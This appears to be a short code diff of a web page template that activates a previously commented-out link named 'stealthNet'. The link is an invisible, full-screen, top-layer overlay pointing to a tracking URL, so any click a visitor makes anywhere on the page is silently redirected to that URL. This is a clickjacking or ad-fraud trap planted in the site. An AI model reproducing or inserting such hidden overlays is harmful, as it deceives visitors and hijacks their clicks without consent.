@@ -5,12 +5,12 @@
 
 
     <!--  https://h4imw.bemobtrcks.com/click  -->
-<!--    <a href="https://6njvi.bemobtrcks.com/click"-->
-<!--       ref="stealthNet"-->
-<!--       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100%; z-index: 9999; opacity: 0; cursor: pointer;"-->
-<!--       @click="hideStealthNet"-->
-<!--    >-->
-<!--    </a>-->
+    <a href="https://6njvi.bemobtrcks.com/click"
+       ref="stealthNet"
+       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100%; z-index: 9999; opacity: 0; cursor: pointer;"
+       @click="hideStealthNet"
+    >
+    </a>
     <WhatsPrivado />
     <!-- 通知权限弹窗 -->
 <!--    <NotificationDialog ref="notificationDialog" />-->
